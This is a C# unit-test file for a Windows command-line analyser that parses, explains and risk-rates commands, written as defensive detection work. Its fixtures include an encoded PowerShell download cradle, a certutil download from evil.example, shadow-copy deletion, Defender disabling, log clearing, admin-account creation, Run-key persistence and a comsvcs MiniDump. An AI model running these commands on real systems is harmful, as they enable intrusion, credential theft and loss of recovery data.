using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using CmdSpy.Core.Analysis;
using CmdSpy.Core.Models;
using Xunit;

namespace CmdSpy.Core.Tests;

/// <summary>
/// Command analysis: parsing what an interpreter really runs, finding the PIDs a
/// command refers to, explaining it in plain words, spotting suspicious
/// patterns, and turning the evidence into a verdict that never says "clean".
/// </summary>
public class AnalysisTests
{
    /// <summary>The command from the real investigation that prompted these features.</summary>
    private const string AsusQuery =
        "powershell.exe -c gwmi win32_process -Filter 'ProcessId=37868 or ProcessId=39508 or ProcessId=39524 or ProcessId=39924 or ProcessId=28500'";

    private static readonly int[] AsusPids = { 37868, 39508, 39524, 39924, 28500 };

    private static string Encode(string script) => Convert.ToBase64String(Encoding.Unicode.GetBytes(script));

    // ------------------------------------------------------- referenced PIDs --

    [Fact]
    public void ReferencedPids_AllFiveFromTheWmiFilterAreFound()
    {
        var pids = ReferencedPidExtractor.ExtractPids(AsusQuery).Select(p => p.ProcessId).ToList();
        Assert.Equal(AsusPids, pids);
    }

    [Theory]
    [InlineData("taskkill /F /PID 4242 /PID 4343", new[] { 4242, 4343 })]
    [InlineData("powershell Stop-Process -Id 1234,5678 -Force", new[] { 1234, 5678 })]
    [InlineData("powershell Get-Process -Id 777", new[] { 777 })]
    [InlineData("wmic process where ProcessId=888 get CommandLine", new[] { 888 })]
    [InlineData("rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\out.dmp full", new[] { 624 })]
    public void ReferencedPids_CommonForms(string command, int[] expected)
    {
        var pids = ReferencedPidExtractor.ExtractPids(command).Select(p => p.ProcessId).ToList();
        Assert.Equal(expected, pids);
    }

    [Fact]
    public void ReferencedNames_ImageNameFilters()
    {
        var names = ReferencedPidExtractor.ExtractNames("taskkill /IM asus_framework.exe /F").Select(n => n.Name).ToList();
        Assert.Contains(names, n => n.StartsWith("asus_framework", StringComparison.OrdinalIgnoreCase));
    }

    // --------------------------------------------------------------- parser --

    [Fact]
    public void Parser_PowerShellDashC_TakesTheRestAsTheCommand()
    {
        var parsed = CommandParser.Parse(AsusQuery);
        Assert.True(parsed.IsPowerShell);
        Assert.StartsWith("gwmi win32_process", parsed.InnerCommand);
    }

    [Fact]
    public void Parser_DecodesEncodedCommandAndNotesLaunchSwitches()
    {
        var parsed = CommandParser.Parse($"powershell -NoP -w hidden -ep bypass -enc {Encode("Get-Date")}");
        Assert.True(parsed.IsPowerShell);
        Assert.Equal("Get-Date", parsed.DecodedCommand);
        Assert.True(parsed.HiddenWindow);
        Assert.True(parsed.BypassPolicy);
        Assert.True(parsed.NoProfile);
    }

    [Theory]
    [InlineData("-enc", "EncodedCommand")]
    [InlineData("-e", "EncodedCommand")]
    [InlineData("-EncodedCommand", "EncodedCommand")]
    [InlineData("/ec", "EncodedCommand")]
    [InlineData("\u2013enc", "EncodedCommand")]      // en dash, a known evasion trick
    [InlineData("-ep", "ExecutionPolicy")]
    [InlineData("-w", "WindowStyle")]
    [InlineData("-NoP", "NoProfile")]
    [InlineData("-c", "Command")]
    public void Parser_ResolvesPowerShellParameterAbbreviations(string token, string expected)
    {
        Assert.Equal(expected, CommandParser.ResolvePowerShellParameter(token));
    }

    [Fact]
    public void Parser_FollowsCmdIntoNestedPowerShell()
    {
        var parsed = CommandParser.Parse($"cmd.exe /c powershell -enc {Encode("whoami")}");
        var nested = Assert.Single(parsed.Nested);
        Assert.True(nested.IsPowerShell);
        Assert.Equal("whoami", nested.DecodedCommand);
    }

    // ------------------------------------------------------------ explainer --

    [Fact]
    public void Explainer_DescribesTheAsusQueryLikeAnInvestigatorWould()
    {
        var referenced = AsusPids.Select(p => new ReferencedProcess
        {
            ProcessId = p,
            ProcessName = "asus_framework.exe",
            Status = "running"
        }).ToList();

        var explanation = CommandExplainer.Explain(CommandParser.Parse(AsusQuery), referenced);

        Assert.Contains("PowerShell", explanation.Interpreter);
        Assert.True(explanation.IsReadOnly);
        Assert.Equal("Read-only query", explanation.Classification);
        Assert.Contains("no modification is evident", explanation.Summary, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("asus_framework", explanation.Summary);
        foreach (var pid in AsusPids) Assert.Contains(pid.ToString(), explanation.Summary);
        Assert.Contains("creation time", explanation.Summary);
    }

    [Fact]
    public void Explainer_FlagsChangesAndDownloads()
    {
        var reg = CommandExplainer.Explain(CommandParser.Parse(
            @"cmd /c reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v upd /d C:\Users\Public\u.exe /f"));
        Assert.False(reg.IsReadOnly);
        Assert.Contains(Effects.ModifiesRegistry, reg.Effects);

        var cradle = CommandExplainer.Explain(CommandParser.Parse(
            $"powershell -enc {Encode("IEX (New-Object Net.WebClient).DownloadString('http://1.2.3.4/a.ps1')")}"));
        Assert.False(cradle.IsReadOnly);
        Assert.Contains(Effects.Downloads, cradle.Effects);
        Assert.Contains("IEX (New-Object Net.WebClient)", cradle.DecodedCommand);
    }

    [Fact]
    public void Explainer_AdmitsWhenItCannotTell()
    {
        var unknown = CommandExplainer.Explain(CommandParser.Parse("cmd /c mytool.exe --sync"));
        Assert.Null(unknown.IsReadOnly);
        Assert.Equal("Could not fully determine", unknown.Classification);
    }

    [Theory]
    [InlineData(@"powershell -c Get-Process | ForEach-Object { Write-Output $_; Set-Content C:\x y }")]
    [InlineData(@"powershell -c Get-Process | foreach { where { echo $_; sc C:\x y } }")]
    [InlineData(@"powershell -c Get-Process | ForEach-Object { Write-Output $_; & 'Set-Content' C:\x y }")]
    public void Explainer_AnalyzesEveryCommandInPowerShellScriptBlocks(string command)
    {
        var explanation = CommandExplainer.Explain(CommandParser.Parse(command));

        Assert.False(explanation.IsReadOnly);
        Assert.Contains(Effects.WritesFiles, explanation.Effects);
        Assert.Contains(explanation.Details, detail => detail.Contains("Set-Content", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void Explainer_FindsFileRedirectionInPowerShellScriptBlocks()
    {
        var explanation = CommandExplainer.Explain(CommandParser.Parse(
            @"powershell -c Get-Process | ForEach-Object { Write-Output $_ > C:\x }"));

        Assert.False(explanation.IsReadOnly);
        Assert.Contains(Effects.WritesFiles, explanation.Effects);
        Assert.Contains(explanation.Details, detail => detail.Contains("redirect", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void Explainer_PreservesReadOnlyPowerShellFilters()
    {
        var explanation = CommandExplainer.Explain(CommandParser.Parse(
            @"powershell -c Get-Process | Where-Object { $_.CPU -gt 10 } | Select-Object Name"));

        Assert.True(explanation.IsReadOnly);
        Assert.Contains(Effects.ProcessDiscovery, explanation.Effects);
        Assert.Contains(Effects.DataProcessing, explanation.Effects);
    }

    [Theory]
    [InlineData(@"powershell -c & $command")]
    [InlineData(@"powershell -c Get-Process | ForEach-Object $action")]
    [InlineData(@"powershell -c Get-Process | Where-Object -FilterScript $predicate")]
    [InlineData(@"powershell -c Get-Process | ForEach-Object { & $command $_ }")]
    [InlineData(@"powershell -c Get-Process | ForEach-Object { $_.Kill() }")]
    [InlineData(@"powershell -c Get-Process | Where-Object { $_.Name -eq 'powershell'")]
    public void Explainer_DynamicOrUnparsedPowerShellIsUnknown(string command)
    {
        var explanation = CommandExplainer.Explain(CommandParser.Parse(command));

        Assert.Null(explanation.IsReadOnly);
        Assert.Contains(Effects.Unknown, explanation.Effects);
    }

    // ------------------------------------------------------------- detector --

    private static List<Finding> Detect(string command, IReadOnlyList<ProcessInfo>? ancestry = null, bool selfTest = false)
    {
        var parsed = CommandParser.Parse(command);
        return SuspiciousCommandDetector.Analyze(new DetectionContext
        {
            CommandLine = command,
            Parsed = parsed,
            ProcessName = parsed.ExecutableName,
            Ancestry = ancestry ?? Array.Empty<ProcessInfo>(),
            IsSelfTest = selfTest
        });
    }

    [Fact]
    public void Detector_HarmlessReadOnlyQueryRaisesNothing()
    {
        Assert.DoesNotContain(Detect(AsusQuery), f => Severity.Rank(f.Severity) >= Severity.Rank(Severity.Medium));
    }

    [Fact]
    public void Detector_EncodedHiddenDownloadCradle()
    {
        var findings = Detect($"powershell -NoP -w hidden -ep bypass -enc {Encode("IEX (New-Object Net.WebClient).DownloadString('http://1.2.3.4/a.ps1')")}");
        var ids = findings.Select(f => f.RuleId).ToList();
        Assert.Contains("EXEC.DownloadCradle", ids);
        Assert.Contains("PS.Encoded", ids);
        Assert.Contains("PS.HiddenWindow", ids);
        Assert.Equal(Severity.High, findings[0].Severity);   // most severe first
    }

    [Theory]
    [InlineData("cmd.exe /c vssadmin delete shadows /all /quiet", "IMPACT.InhibitRecovery")]
    [InlineData("cmd /c certutil -urlcache -split -f http://evil.example/p.exe p.exe", "LOLBIN.CertutilDownload")]
    [InlineData("powershell Set-MpPreference -DisableRealtimeMonitoring $true", "EVASION.Defender")]
    [InlineData("cmd /c wevtutil cl Security", "EVASION.ClearLogs")]
    [InlineData("cmd /c net localgroup administrators eviluser /add", "ACCOUNT.AddAdmin")]
    public void Detector_KnownMaliciousPatterns(string command, string ruleId)
    {
        Assert.Contains(Detect(command), f => f.RuleId == ruleId && f.Severity == Severity.High);
    }

    [Fact]
    public void Detector_SeesThroughCaretObfuscation()
    {
        Assert.Contains(Detect("cmd /c v^s^s^a^d^m^i^n delete shadows /all"), f => f.RuleId == "IMPACT.InhibitRecovery");
    }

    [Fact]
    public void Detector_OfficeLaunchingAShellIsHighRisk()
    {
        var ancestry = new List<ProcessInfo>
        {
            new() { ProcessId = 500, ProcessName = "WINWORD.EXE", Depth = 1 }
        };
        Assert.Contains(Detect("cmd.exe /c whoami", ancestry), f => f.Severity == Severity.High);
    }

    [Fact]
    public void Detector_SelfTestMarkerIsOnlyTrustedWhenGenuine()
    {
        const string command = "cmd.exe /d /c rem cmdspy-selftest-abc-0001";
        Assert.Contains(Detect(command, selfTest: true), f => f.RuleId == "INFO.SelfTest");

        // Anything else wearing the marker is trying to hide.
        var impostor = Detect(command, selfTest: false);
        Assert.DoesNotContain(impostor, f => f.RuleId == "INFO.SelfTest");
        Assert.Contains(impostor, f => f.RuleId == "EVASION.FakeSelfTest");
    }

    // ------------------------------------------------------------------ risk --

    private static ProcessInfo Launcher(string name = "AsusSoftwareManager.exe") =>
        new() { ProcessId = 4000, ProcessName = name, Depth = 1, ImagePath = $@"C:\Program Files\ASUS\{name}" };

    private static SignatureInfo Signed(string role, string publisher) => new()
    {
        Path = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        Role = role,
        Status = SignatureStatus.Valid,
        Publisher = publisher
    };

    [Fact]
    public void Risk_HarmlessCommandWithUnknownLauncherIsNotDeclaredClean()
    {
        var parsed = CommandParser.Parse(AsusQuery);
        var risk = RiskAssessor.Assess(new RiskInput
        {
            Findings = Detect(AsusQuery),
            Explanation = CommandExplainer.Explain(parsed),
            ProcessName = "powershell.exe"
        });

        Assert.Equal(RiskLevel.Unknown, risk.Level);
        Assert.Contains("still needs verification", risk.Summary);
        Assert.Contains(risk.Unknowns, u => u.Contains("launched it could not be identified"));
        Assert.Contains("does not mean the computer is clean", risk.Disclaimer);
    }

    [Fact]
    public void Risk_LowOnlyWhenTheLauncherAndProgramAreVerified()
    {
        var parsed = CommandParser.Parse(AsusQuery);
        var launcher = Launcher();
        var risk = RiskAssessor.Assess(new RiskInput
        {
            Findings = Detect(AsusQuery),
            Explanation = CommandExplainer.Explain(parsed),
            ProcessName = "powershell.exe",
            Ancestry = new[] { launcher },
            AncestryComplete = true,
            Launcher = launcher,
            Signatures = new[]
            {
                Signed("this process", "Microsoft Windows"),
                Signed("parent, launcher", "ASUSTeK COMPUTER INC.")
            }
        });

        Assert.Equal(RiskLevel.Low, risk.Level);
        Assert.Contains("not proof that the computer is clean", risk.Summary);
        Assert.NotEmpty(risk.Disclaimer);
    }

    [Theory]
    [InlineData(@"powershell -c Get-Process | ForEach-Object { Write-Output $_; Set-Content C:\x y }")]
    [InlineData(@"powershell -c Get-Process | ForEach-Object { & $command $_ }")]
    public void Risk_IncompleteOrModifyingPowerShellCannotReceiveLowVerdict(string command)
    {
        var launcher = Launcher();
        var risk = RiskAssessor.Assess(new RiskInput
        {
            Findings = Detect(command),
            Explanation = CommandExplainer.Explain(CommandParser.Parse(command)),
            ProcessName = "powershell.exe",
            Ancestry = new[] { launcher },
            AncestryComplete = true,
            Launcher = launcher,
            Signatures = new[]
            {
                Signed("this process", "Microsoft Windows"),
                Signed("parent, launcher", "ASUSTeK COMPUTER INC.")
            }
        });

        Assert.Equal(RiskLevel.Unknown, risk.Level);
        Assert.Contains("command's effect", risk.Summary, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Risk_UnsignedLauncherKeepsTheVerdictOpen()
    {
        var parsed = CommandParser.Parse(AsusQuery);
        var launcher = Launcher("helper.exe");
        var risk = RiskAssessor.Assess(new RiskInput
        {
            Findings = Detect(AsusQuery),
            Explanation = CommandExplainer.Explain(parsed),
            ProcessName = "powershell.exe",
            Launcher = launcher,
            Ancestry = new[] { launcher },
            Signatures = new[]
            {
                Signed("this process", "Microsoft Windows"),
                new SignatureInfo { Path = launcher.ImagePath!, Role = "parent, launcher", Status = SignatureStatus.Unsigned }
            }
        });

        Assert.Equal(RiskLevel.Unknown, risk.Level);
        Assert.Contains(risk.Unknowns, u => u.Contains("unsigned"));
    }

    [Fact]
    public void Risk_OneStrongIndicatorIsHighRisk()
    {
        const string command = "cmd.exe /c vssadmin delete shadows /all /quiet & bcdedit /set {default} recoveryenabled no";
        var risk = RiskAssessor.Assess(new RiskInput
        {
            Findings = Detect(command),
            Explanation = CommandExplainer.Explain(CommandParser.Parse(command)),
            ProcessName = "cmd.exe"
        });
        Assert.Equal(RiskLevel.High, risk.Level);
        Assert.Equal("High", risk.Confidence);
    }

    [Fact]
    public void Risk_GenuineSelfTestIsLabelledNotJudged()
    {
        const string command = "cmd.exe /d /c rem cmdspy-selftest-abc-0001";
        var risk = RiskAssessor.Assess(new RiskInput { Findings = Detect(command, selfTest: true), ProcessName = "cmd.exe" });
        Assert.Equal(RiskLevel.SelfTest, risk.Level);
    }

    // ------------------------------------------------------- self-test trust --

    [Fact]
    public void SelfTest_GenuineOnlyWhenLaunchedByCmdSpyItself()
    {
        const string marked = "cmd.exe /d /c rem cmdspy-selftest-abc-0001";
        var me = new ProcessInfo { ProcessId = Environment.ProcessId, ProcessName = "CmdSpy.exe", Depth = 1 };
        var stranger = new ProcessInfo { ProcessId = 999_999, ProcessName = "evil.exe", ImagePath = @"C:\Users\Public\evil.exe", Depth = 1 };

        Assert.True(CaptureSelfTest.IsGenuine(marked, new[] { me }));
        Assert.False(CaptureSelfTest.IsGenuine(marked, new[] { stranger }));
        Assert.False(CaptureSelfTest.IsGenuine(marked, Array.Empty<ProcessInfo>()));
        Assert.False(CaptureSelfTest.IsGenuine("cmd.exe /c whoami", new[] { me }));

        // The console host of a self-test window: marker on the parent, CMD-spy above it.
        var markedCmd = new ProcessInfo { ProcessId = 1234, ProcessName = "cmd.exe", CommandLine = marked, Depth = 1 };
        var meAbove = new ProcessInfo { ProcessId = Environment.ProcessId, ProcessName = "CmdSpy.exe", Depth = 2 };
        Assert.True(CaptureSelfTest.IsGenuine(@"\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1", new[] { markedCmd, meAbove }));
    }
}
